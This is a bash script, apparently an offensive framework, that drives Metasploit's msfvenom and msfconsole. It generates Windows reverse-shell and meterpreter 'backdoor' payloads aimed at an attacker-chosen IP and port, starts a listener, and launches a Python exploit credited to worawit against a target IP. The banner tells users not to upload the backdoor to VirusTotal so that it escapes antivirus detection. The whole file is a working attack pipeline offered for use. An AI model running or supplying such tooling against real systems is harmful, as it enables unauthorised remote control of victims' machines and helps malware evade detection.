#!/bin/bash
#color code?
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[0;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'
file="dependencies/config.path"
msfconsole=`sed -n 1p $file`
msfvenom=`sed -n 2p $file`
python=`sed -n 3p $file`
#IP addreses setup
function ipaddr_setup {
echo -ne $okegreen "  Set your ip : "
read localip
echo -ne $okegreen "  Set your port : "
read localport
echo -ne $okegreen "  Set the target ip : "
read targetip
echo -ne $okegreen "  Set target architecture (x64/x86) : "
read targetarch
}
function ipaddr_setup_with_choose_of_paylaod {
echo -e $red " PLEASE BE ATTENTIVELY IN CHOICE PAYLOAD (ex.:windows/x64/shell/reverse_tcp)"
echo -ne $okegreen "  Set payload to use : "
read payload
echo -ne $okegreen "  Set your ip : "
read localip
echo -ne $okegreen "  Set your port : "
read localport
echo -ne $okegreen "  Set target ip : "
read targetip
echo -ne $okegreen "  Set target architecture (x64/x86) : "
read targetarch
echo -ne $okegreen "  Set a filename : "
read filename
clear
menu
}
function pldgen {
echo -ne $orange " Check payload configuration before complining "
read fgd
echo -ne $orange " Set an exploit to be used (exploit7(8).py) : "
read exploitvers
echo -ne $okegreen "  Name you payload : "
read pldname
msfvenom -p $payload -f raw -o $pldname.bin EXITFUNC=thread LHOST=$localip LPORT=$localport
cat scripts/shellcode_$targetarch $pldname.bin > $pldname.f.bin
pldname=$pldname.f
echo -e $orange "  Would you like to start msf listener now ? (y/n)"
read qawsed
case $qawsed in
y|Y|Yes|yes|YES)
xterm msfconsole -r tmp/listener.rc
;;
n|no|No|NO)
echo -e $orange "  After generating, write in terminal: msfconsole -r path/to/listener/*name*.rc"
sleep 3
clear
menu
;;
esac
}
function checker {
echo -e $yellow ""
cat << !
  Generate Backdoor
  +------------++-------------------------++-----------------------+
  | Name       ||  Descript   	          || Your Input
  +------------++-------------------------++-----------------------+
  | LHOST      ||  The Listen Addres      || $localip
  | LPORT      ||  The Listen Ports       || $localport
  | OUTPUTNAME ||  The Filename output    || $filename
  | PAYLOAD    ||  Payload To Be Used     || $payload
  +------------++-------------------------++-----------------------+


!
echo -ne $orange "  Return to menu ? (y/n)"
read trn
case $trn in
y|Y|Yes|yes|YES)
clear
menu
;;
n|no|No|NO)
;;
esac
}
# Windows msfvenom payload selection
function pldwin () {
echo ""
echo -e $orange "  +-------------------------------------------+"
echo -e $orange "  |$white [$okegreen 1$white ]$yellow windows/shell_bind_tcp$orange              |"
echo -e $orange "  |$white [$okegreen 2$white ]$yellow windows/shell/reverse_tcp$orange           |"
echo -e $orange "  |$white [$okegreen 3$white ]$yellow windows/meterpreter/reverse_tcp$orange     |"
echo -e $orange "  |$white [$okegreen 4$white ]$yellow windows/meterpreter/reverse_tcp_dns$orange |"
echo -e $orange "  |$white [$okegreen 5$white ]$yellow windows/meterpreter/reverse_http$orange    |"
echo -e $orange "  |$white [$okegreen 6$white ]$yellow windows/meterpreter/reverse_https$orange   |"
echo -e $orange "  +-------------------------------------------+"
echo ""
echo -ne $okegreen " Need other payloads ? (y/n)"
read asdfg
case $asdfg in
y|Y|Yes|yes|YES)
clear
ipaddr_setup_with_choose_of_paylaod
;;
n|no|No|NO)
;;
esac
echo -ne $okegreen "  Choose Payload :";tput sgr0
read pld
case $pld in
1)
payload="windows/shell_bind_tcp"
ipaddr_setup
echo -en $okegreen "  Name a file : "
read filename
clear
menu
;;
2)
payload="windows/shell/reverse_tcp"
ipaddr_setup
echo -en $okegreen "  Name a file : "
read filename
clear
menu
;;
3)
payload="windows/meterpreter/reverse_tcp"
ipaddr_setup
echo -en $okegreen "  Name a file : "
read filename
clear
menu
;;
4)
payload="windows/meterpreter/reverse_tcp_dns"
ipaddr_setup
echo -en $okegreen "  Name a file : "
read filename
clear
menu
;;
5)
payload="windows/meterpreter/reverse_http"
ipaddr_setup
echo -en $okegreen "  Name a file : "
read filename
clear
menu
;;
6)
payload="windows/meterpreter/reverse_https"
ipaddr_setup
echo -en $okegreen "  Name a file : "
read filename
clear
menu
;;
*)
echo ""
clear
echo -e $red "Wrong input , choose between 1 and 6"
pldwin
;;
esac
}
# Main
function menu {
      echo -e $white " "
      echo -e $white"	[$okegreen"1"$white]$okegreen  Generate a payload+listener"
      echo -e $white"	[$okegreen"2"$white]$okegreen  Check configuration"
      echo -e $white"	[$okegreen"3"$white]$okegreen  Prepare for attack "
      echo -e $white"	[$okegreen"4"$white]$okegreen  Attack "
      echo -e $white"	[$okegreen"5"$white]$okegreen  Credits  "
      echo -e $white"	[$okegreen"6"$white]$okegreen  Exit  "
      echo -e " "
      echo -e $okegreen" ┌─["$red"exploit~menu$okegreen]"
      echo -ne $okegreen" └─────► " ;tput sgr0
read menu_answer
case $menu_answer in
1)
clear
pldwin
;;
2)
clear
checker
;;
3)
pldgen
;;
4)
echo -e $BlueF " Is a lisneter started ? "
sleep 2
echo -e $red " Everythings is prepared push [ENTER] to start exploitation "
python scripts/$exploitvers $targetip $pldname.bin 12
;;
5)
clear
echo 
echo -e $okegreen " Author of exploit worawit https://github.com/worawit"
echo 
echo -e $cyan " Design style by Screetsec https://github.com/Screetsec"
echo -e "framework written by missyes"
read sadasd
clear
menu
;;
6)
          echo ""
          echo -e $okegreen"  REMEMBER , DONT UPLOAD TO VIRUSTOTAL !!"
          echo ""
          read -p "  Press [Enter] key to Exit..."
          sleep 2
          clear
          exit
;;
*)
echo ""
clear
echo -e $red "Wrong input , choose between 1 and 2"
menu
;;
esac
}
function mtspl() {
# check if metasploit-framework its installed
      which $msfconsole > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo -e $okegreen [✔]::[Msfconsole]: Installation found!;
else
   echo -e $red [x]::[warning]:this script require msfconsole installed to work ;
   echo ""
   echo -e $red [!]::install metasploit-framework ;
   sleep 0.5
exit 1
fi
sleep 0.5

# check if msfvenom exists
      which $msfvenom > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo -e $okegreen [✔]::[Msfvenom]: Installation found!;
else

   echo -e $red [x]::[warning]:this script require msfvenom installed to work ;
   echo ""
   echo -e $red [!]::install metasploit-framework ;
   sleep 0.5
exit 1
fi
sleep 0.5
# check if python exists
      which $python > /dev/null 2>&1
      if [ "$?" -eq "0" ]; then
      echo -e $okegreen [✔]::[Python]: Installation found!;
else

   echo -e $red [x]::[warning]:this script require python installed to work ;
   echo ""
   echo -e $red [!]::install python ;
   sleep 0.5
exit 1
fi
sleep 0.5
clear
menu
}
clear
echo -e $red""
echo "                                                                  ";
echo "=================================================================="
echo "         WARNING !  WARNING ! WARNING ! WARNING ! WARNING ! "
echo "    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM   "
echo "=================================================================="
echo " ____  _____ _____ _____    _____ _____ __    _____ _____ ____    ";
echo "|    \|     |   | |_   _|  |  |  |  _  |  |  |     |  _  |    \   ";
echo "|  |  |  |  | | | | | |    |  |  |   __|  |__|  |  |     |  |  |  ";
echo "|____/|_____|_|___| |_|    |_____|__|  |_____|_____|__|__|____/   ";
echo "                         _____ _____                              ";
echo "                        |_   _|     |                             ";
echo "                          | | |  |  |                             ";
echo "                          |_| |_____|                             ";
echo " _____ _____ _____ _____ _____    _____ _____ _____ _____ __      ";
echo "|  |  |     | __  |  |  |   __|  |_   _|     |_   _|  _  |  |     ";
echo "|  |  |-   -|    -|  |  |__   |    | | |  |  | | | |     |  |__   ";
echo " \___/|_____|__|__|_____|_____|    |_| |_____| |_| |__|__|_____|  ";
echo "=================================================================="
echo "       PLEASE DON'T UPLOAD BACKDOOR TO WWW.VIRUSTOTAL.COM "
echo "    YOU CAN UPLOAD OUTPUT/BACKDOOR FILE TO WWW.NODISTRIBUTE.COM   "
echo "=================================================================="
echo ""
echo -n "Press [Enter] key to continue .............."
read warning
clear
mtspl
sleep 3
menu
